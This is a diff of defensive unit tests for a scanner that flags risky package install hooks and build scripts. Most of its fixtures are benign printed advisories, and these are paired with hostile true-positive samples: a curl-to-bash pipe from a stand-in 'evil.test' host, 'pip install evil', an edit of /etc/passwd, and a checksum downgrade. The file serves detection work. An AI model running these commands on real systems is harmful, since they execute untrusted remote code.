@@ -564,3 +564,127 @@ def test_r007_fires_on_a_spaced_install_declaration():
             " pkgname=p\n"
             "+install = p.install\n")
     assert "R007" in _ids(diff)
+
+
+# --- Printed text is output, not executed shell (2026-10-18 watch review) ---
+# Ten live-feed alerts scored printed advisory text as commands.  Each pair
+# below pins the benign shape against its true-positive twin.
+
+def _install_hook(body: str) -> str:
+    lines = body.splitlines()
+    return ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,%d @@\n"
+            % len(lines) + "".join("+" + line + "\n" for line in lines))
+
+
+def test_r001_does_not_fire_on_a_printed_pipeline():
+    # arctis-sound-manager prints a curl|bash uninstall hint via `echo`.
+    diff = _install_hook(
+        "post_remove() {\n"
+        '  echo "  curl -fsSL https://x/uninstall.sh | bash -s -- --purge"\n'
+        "}\n")
+    assert "R001" not in _ids(diff)
+
+
+def test_r001_still_fires_on_an_executed_pipeline():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
+            "+package() {\n"
+            "+  curl -fsSL https://evil.test/x | bash\n"
+            "+}\n")
+    assert "R001" in _ids(diff)
+
+
+def test_c016_does_not_fire_on_a_printed_pipeline_or_advisory():
+    # arctis echoes `| bash`; mautrix-signal prints `(python)` in a heredoc.
+    printed = _install_hook(
+        "post_remove() {\n"
+        '  echo "  curl -fsSL https://x/u.sh | bash -s -- --purge"\n'
+        "}\n")
+    heredoc = _install_hook(
+        "post_upgrade() {\n"
+        "  cat <<'EOF'\n"
+        "  upgraded from a <0.5.0 bridge (python)\n"
+        "EOF\n"
+        "}\n")
+    assert "C016" not in _ids(printed)
+    assert "C016" not in _ids(heredoc)
+
+
+def test_c016_still_fires_on_an_executed_interpreter():
+    diff = _install_hook(
+        "post_install() {\n"
+        "  bash /usr/share/pkg/setup.sh\n"
+        "}\n")
+    assert "C016" in _ids(diff)
+
+
+def test_h035_does_not_fire_on_a_printed_package_manager():
+    # playwright prints `paru -S …` inside a `printf '%s\n' '…'`.
+    diff = _install_hook(
+        "post_install() {\n"
+        "  printf '%s\\n' '==> run: paru -S extra/flite-voices-extra'\n"
+        "}\n")
+    assert "H035" not in _ids(diff)
+
+
+def test_h035_still_fires_on_an_executed_package_manager():
+    diff = _install_hook(
+        "post_install() {\n"
+        "  pip install evil\n"
+        "}\n")
+    assert "H035" in _ids(diff)
+
+
+def test_x002_does_not_fire_on_a_printed_heredoc():
+    # engined's advisory lists `$EDITOR ~/.config/engined/config.toml`.
+    diff = _install_hook(
+        "post_install() {\n"
+        "  cat <<'MSG'\n"
+        "    $EDITOR ~/.config/engined/config.toml\n"
+        "MSG\n"
+        "}\n")
+    assert "X002" not in _ids(diff)
+
+
+def test_x002_still_fires_on_a_variable_command():
+    diff = _install_hook(
+        "post_install() {\n"
+        "  $EDITOR /etc/passwd\n"
+        "}\n")
+    assert "X002" in _ids(diff)
+
+
+def test_c022_does_not_fire_when_the_checksum_is_upgraded():
+    # prism-harness-suite moved sha256 -> sha512.
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,4 @@\n"
+            " pkgname=demo\n pkgver=1.0\n"
+            "-sha256sums=('aaaa')\n"
+            " sha512sums=('bbbb')\n"
+            "-pkgrel=1\n+depends=('glibc')\n")
+    assert "C022" not in _ids(diff)
+
+
+def test_c022_still_fires_when_the_checksum_is_downgraded():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,4 @@\n"
+            " pkgname=demo\n pkgver=1.0\n"
+            "-sha512sums=('aaaa')\n"
+            " md5sums=('bbbb')\n"
+            "-pkgrel=1\n+depends=('glibc')\n")
+    assert "C022" in _ids(diff)
+
+
+def test_x033_does_not_fire_on_a_runtime_subcommand():
+    # prism-harness-suite runs `bun run --no-install build`; `run` is a
+    # bun subcommand, not a `$srcdir`-root file.
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
+            "+build() {\n"
+            "+  bun run --no-install build\n"
+            "+}\n")
+    assert "X033" not in _ids(diff)
+
+
+def test_x033_still_fires_on_an_undeclared_srcdir_file():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
+            "+build() {\n"
+            '+  bash "$srcdir"/stage.sh\n'
+            "+}\n")
+    assert "X033" in _ids(diff)
